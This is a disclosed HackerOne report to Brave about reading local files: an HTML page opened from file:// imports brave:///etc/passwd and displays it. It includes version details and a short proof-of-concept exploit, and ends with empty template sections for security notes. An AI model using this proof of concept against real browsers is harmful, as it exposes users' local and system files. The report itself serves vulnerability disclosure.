---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '390362'
original_report_id: '390362'
title: Local files reading from the "file://" origin through `brave://`
team_handle: brave
created_at: '2018-08-03T23:06:57.182Z'
disclosed_at: '2018-09-29T00:15:51.923Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 23
asset_identifier: https://github.com/brave/muon
asset_type: SOURCE_CODE
max_severity: none
tags:
- hackerone
---

# Local files reading from the "file://" origin through `brave://`

## Metadata

- HackerOne Report ID: 390362
- Weakness: 
- Program: brave
- Disclosed At: 2018-09-29T00:15:51.923Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:

Sadly, fix for #390013 works only for web. Loading `brave://` from the `file://` origin allows reading local files on the device.

> I said that fix could be insufficient 😈

`file://` and `brave://` both are local origins. That means it's possible to access `brave://` from `file://` and vice versa.

## Products affected: 

Brave: 0.23.77 
V8: 6.8.275.24 
rev: 0125b5f5ddc7eebc832ceeb4f4275230ec49d149 
Muon: 8.0.6 
OS Release: 17.7.0 
Update Channel: Релиз 
OS Architecture: x64 
OS Platform: macOS 
Node.js: 7.9.0 
Brave Sync: v1.4.2 
libchromiumcontent: 68.0.3440.84

## Steps To Reproduce:

```html
<head>
    <script>
        function show() {
            var file = link.import.querySelector('body')
            alert(file.innerHTML)
        }
    </script>
    <link id="link" href="brave:///etc/passwd" rel="import" as="document" onload="show()" />
</head>
```
## Supporting Material/References:

Screencast + PoC attached.

## Impact

Local files reading should be denied.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
